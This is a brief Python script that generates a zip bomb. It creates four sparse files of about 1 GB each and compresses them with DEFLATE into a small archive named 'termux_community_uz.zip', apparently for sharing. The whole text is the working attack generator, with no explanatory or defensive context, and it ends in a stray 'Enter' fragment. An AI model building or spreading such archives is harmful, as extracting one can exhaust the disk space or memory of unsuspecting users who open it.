import zipfile
for i in range(4):
	with open(f'py_to_py{i}.txt', 'wb') as f:
	    	f.seek(1024*1024*1024)
	    	f.write(b'0')
	

with zipfile.ZipFile('termux_community_uz.zip', 'w') as zipf:
    for i in range(4):
    	zipf.write(f'py_to_py{i}.txt', compress_type=zipfile.ZIP_DEFLATED)
￼Enter
